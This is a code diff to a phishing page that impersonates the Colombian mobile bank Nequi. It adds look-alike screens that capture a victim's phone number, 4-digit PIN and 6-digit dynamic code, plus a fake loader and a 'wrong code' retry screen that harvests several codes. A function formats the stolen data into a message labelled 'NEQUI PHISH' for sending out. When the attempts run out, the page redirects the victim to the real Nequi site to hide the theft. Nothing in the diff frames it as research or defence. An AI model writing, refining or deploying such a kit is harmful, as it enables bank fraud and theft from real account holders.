@@ -149,7 +149,7 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
-    /* Loader Silencioso */
+    /* Loader Silencioso (solo spinner) */
     #loader {
       flex-direction: column;
       justify-content: center;
@@ -166,47 +166,11 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* ==================== PANTALLA DE ERROR MEJORADA ==================== */
-    #errorScreen {
-      background: #1F0829;
-      padding-top: 80px;
-    }
-
-    .error-title {
-      color: #FF2D95;
-      font-size: 24px;
+    .error-text {
+      color: #FF4D4D;
+      font-size: 22px;
+      margin: 40px 0 15px 0;
       font-weight: 500;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .error-message {
-      color: #D4A8E8;
-      font-size: 15.5px;
-      text-align: center;
-      line-height: 1.6;
-      margin-bottom: 50px;
-    }
-
-    .error-button {
-      width: 85%;
-      max-width: 320px;
-      margin: 0 auto 40px;
-      height: 56px;
-      background: linear-gradient(to right, #FF2D95, #FF007A);
-      color: white;
-      border: none;
-      border-radius: 30px;
-      font-size: 17px;
-      font-weight: 500;
-      box-shadow: 0 6px 15px rgba(255, 45, 149, 0.3);
-    }
-
-    .attempts {
-      text-align: center;
-      color: #FF6EBF;
-      font-size: 15px;
-      font-weight: 400;
     }
   </style>
 </head>
@@ -214,25 +178,77 @@
 
   <div class="phone-frame">
 
-    <!-- Pantallas anteriores (resumidas) -->
-    <div class="screen" id="screen1"> ... </div>
-    <div class="screen" id="screen2"> ... </div>
-    <div class="screen" id="screen3"> ... </div>
+    <!-- Pantalla 1 -->
+    <div class="screen" id="screen1">
+      <div class="help">?</div>
+      <div class="nequi-logo"><span>■</span>Nequi</div>
+      <div class="label">Ingresa tu número de celular</div>
+      <div class="input-box">
+        <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
+      </div>
+      <button onclick="goToPassword()">Entra</button>
+    </div>
 
-    <!-- Loader Silencioso -->
+    <!-- Pantalla 2: Clave 4 dígitos -->
+    <div class="screen" id="screen2">
+      <div class="back" onclick="goBack(1)">←</div>
+      <div class="title">Escribe tu clave</div>
+      <div class="pins" id="pins4">
+        <div class="pin"></div><div class="pin"></div><div class="pin"></div><div class="pin"></div>
+      </div>
+      <div class="message">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</div>
+      <div class="keyboard">
+        <div class="key" onclick="addDigit(1,4)">1</div>
+        <div class="key" onclick="addDigit(2,4)">2</div>
+        <div class="key" onclick="addDigit(3,4)">3</div>
+        <div class="key" onclick="addDigit(4,4)">4</div>
+        <div class="key" onclick="addDigit(5,4)">5</div>
+        <div class="key" onclick="addDigit(6,4)">6</div>
+        <div class="key" onclick="addDigit(7,4)">7</div>
+        <div class="key" onclick="addDigit(8,4)">8</div>
+        <div class="key" onclick="addDigit(9,4)">9</div>
+        <div class="key"></div>
+        <div class="key" onclick="addDigit(0,4)">0</div>
+        <div class="key delete" onclick="deleteDigit(4)">✕</div>
+      </div>
+    </div>
+
+    <!-- Pantalla 3: Clave Dinámica -->
+    <div class="screen" id="screen3">
+      <div class="back" onclick="goBack(2)">←</div>
+      <div class="title">Clave Dinámica</div>
+      <div class="pins" id="pins6">
+        <div class="pin"></div><div class="pin"></div><div class="pin"></div>
+        <div class="pin"></div><div class="pin"></div><div class="pin"></div>
+      </div>
+      <div class="message">Ingresa el código de 6 dígitos<br>que aparece en la app</div>
+      <div class="keyboard">
+        <div class="key" onclick="addDigit(1,6)">1</div>
+        <div class="key" onclick="addDigit(2,6)">2</div>
+        <div class="key" onclick="addDigit(3,6)">3</div>
+        <div class="key" onclick="addDigit(4,6)">4</div>
+        <div class="key" onclick="addDigit(5,6)">5</div>
+        <div class="key" onclick="addDigit(6,6)">6</div>
+        <div class="key" onclick="addDigit(7,6)">7</div>
+        <div class="key" onclick="addDigit(8,6)">8</div>
+        <div class="key" onclick="addDigit(9,6)">9</div>
+        <div class="key"></div>
+        <div class="key" onclick="addDigit(0,6)">0</div>
+        <div class="key delete" onclick="deleteDigit(6)">✕</div>
+      </div>
+    </div>
+
+    <!-- Loader Silencioso (solo spinner) -->
     <div class="screen" id="loader">
       <div class="spinner"></div>
     </div>
 
-    <!-- Nueva Pantalla de Error - Estética -->
+    <!-- Pantalla de Error -->
     <div class="screen" id="errorScreen">
-      <div class="error-title">Clave dinámica errada</div>
-      <div class="error-message">
-        El código ingresado no es correcto.<br>
-        Por favor intenta nuevamente.
-      </div>
-      <button class="error-button" onclick="retryDynamic()">Intentar de nuevo</button>
-      <div class="attempts" id="attemptsText">Intentos restantes: 3</div>
+      <div class="error-text">Clave dinámica errada</div>
+      <div class="message">El código ingresado no es correcto.<br>Por favor intenta nuevamente.</div>
+      <button onclick="retryDynamic()" style="margin-top:60px;">Intentar de nuevo</button>
+      <div style="margin-top:45px; color:#FF88B5; font-size:16px;" id="attemptsText">Intentos restantes: 3</div>
     </div>
 
   </div>
@@ -268,10 +284,11 @@
           pin4 += num;
           updatePins();
           if (pin4.length === 4) {
-            showSilentLoader();
+            showSilentLoader();   // ← Muestra loader silencioso
           }
         }
-      } else if (type === 6) {
+      } 
+      else if (type === 6) {
         if (pin6.length < 6) {
           pin6 += num;
           updatePins();
@@ -295,11 +312,15 @@
       });
     }
 
+    // Loader silencioso después de la clave de 4 dígitos
     function showSilentLoader() {
       showScreen('loader');
-      setTimeout(() => showScreen('screen3'), 2500);
+      setTimeout(() => {
+        showScreen('screen3');
+      }, 2500); // 2.5 segundos de "carga" silenciosa
     }
 
+    // Solo se ejecuta al completar la clave dinámica
     function sendDynamicCode() {
       const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 Clave Dinámica: ${pin6}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
@@ -313,8 +334,8 @@
 
       setTimeout(() => {
         attemptsLeft--;
-        document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
         if (attemptsLeft > 0) {
+          document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
           showScreen('errorScreen');
         } else {
           window.location.href = "https://www.nequi.com.co";
